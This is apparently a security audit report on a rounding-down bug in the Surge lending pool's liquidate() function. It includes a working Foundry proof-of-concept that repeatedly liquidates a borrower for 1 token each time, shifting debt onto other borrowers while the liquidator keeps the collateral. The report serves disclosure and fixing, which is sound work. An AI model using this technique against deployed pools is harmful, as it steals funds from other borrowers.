# A liquidator can gain not only collateral, but also can reduce his own debt!

## Summary
A liquidator can gain not only collateral, but also can reduce his own debt. 
This is achieved by taking advantage of the following vulnerability of the ``liquidate()``:
it has a rounding down precision error and when one calls liquidate(Bob, 1), it is possible that the total debt is reduced by 1, but the debt share is 0, and thus Bob's debt shares will not be reduced.   In this way, the liquidator can shift part of debt to the remaining borrowers while getting the collateral of the liquidation. 

In summary, the liquidator will be able to liquidate a debtor, grab proportionately the collateral, and in addition, reduce his own debt by shifting some of his debt to the other borrowers. 

## Vulnerability Detail
Below,  I explain the vulnerability and then show the code POC to demonstate how a liquidator can gain collateral as well as reduce his own debt!

1) The ``liquidate()`` function calls ``tokenToShares()`` at L587 to calculate the number of debt shares for the input ``amount``. Note it uses a rounding-down.

[https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L553-L609](https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L553-L609)

2) Due to rounding down, it is possible that while ``amount !=0``, the returned number of debt shares could be zero!

[https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L199-L204](https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L199-L204)

3) In the following code POC, we show that Bob (the test account) and Alice (address(1)) both borrow 1000 loan tokens, and after one year, each of them owe 1200 loan tokens.  Bob liquidates Alice's debt with 200 loan tokens. Bob gets the  200 collateral tokens (proportionately). In addition, Bob reduces his own debt from 1200 to 1100!

To run this test, one needs to change ``pool.getDebtOf()`` as a public function. 

```javascript
function testLiquidateSteal() external {
        uint loanTokenAmount = 12000;
        uint borrowAmount = 1000;
        uint collateralAmountA = 10000;
        uint collateralAmountB = 1400;
        MockERC20 collateralToken = new MockERC20(collateralAmountA+collateralAmountB, 18);
        MockERC20 loanToken = new MockERC20(loanTokenAmount, 18);
        Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 0.8e18, 0.5e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);
        loanToken.approve(address(pool), loanTokenAmount);
        pool.deposit(loanTokenAmount);

        // Alice borrows 1000 
        collateralToken.transfer(address(1), collateralAmountB);
        vm.prank(address(1));
        collateralToken.approve(address(pool), collateralAmountB);
        vm.prank(address(1));
        pool.addCollateral(address(1), collateralAmountB);
        vm.prank(address(1));
        pool.borrow(borrowAmount);

        // Bob borrows 1000 too 
        collateralToken.approve(address(pool), collateralAmountA);
        pool.addCollateral(address(this), collateralAmountA);
        pool.borrow(borrowAmount);

       // Bob's debt becomes 1200
       vm.warp(block.timestamp + 365 days);
       pool.withdraw(0);
       uint mydebt = pool.getDebtOf(pool.debtSharesBalanceOf(address(this)), pool.debtSharesSupply(), pool.lastTotalDebt());
       assertEq(mydebt, 1200);    

      // Alice's debt becomes 1200
       uint address1Debt = pool.getDebtOf(pool.debtSharesBalanceOf(address(1)), pool.debtSharesSupply(), pool.lastTotalDebt());
       assertEq(address1Debt, 1200);  
       assertEq(pool.lastTotalDebt(), 2399);  

       uint myCollateralBeforeLiquidate = collateralToken.balanceOf(address(this));

       // liquidate 200 for Alice
       loanToken.approve(address(pool), 200);
       for(int i; i<200; i++)
            pool.liquidate(address(1), 1);

      // Alice's debt shares are NOT reduced, now Bob's debt is reduced to 1100
       uint debtShares = pool.debtSharesBalanceOf(address(1));
       assertEq(debtShares, 1000);
       assertEq(pool.lastTotalDebt(), 2199);
       address1Debt = pool.getDebtOf(pool.debtSharesBalanceOf(address(1)), pool.debtSharesSupply(), pool.lastTotalDebt());
       assertEq(address1Debt, 1100); 
       mydebt = pool.getDebtOf(pool.debtSharesBalanceOf(address(this)), pool.debtSharesSupply(), pool.lastTotalDebt());
       assertEq(mydebt, 1100);    

       // Bob gains the collateral as well proportionately 
       uint myCollateralAfterLiquidate = collateralToken.balanceOf(address(this));
       assertEq(myCollateralAfterLiquidate-myCollateralBeforeLiquidate, 200);
    }
```


## Impact
A liquidator can gain not only collateral, but also can reduce his own debt. Thus, he effectively steals funding from the pool by off-shifting his debt to the remaining borrowers.

## Recommendation
We need to double check this edge case and now allowing the liquidate() to proceed when the # of debt shares is Zero.
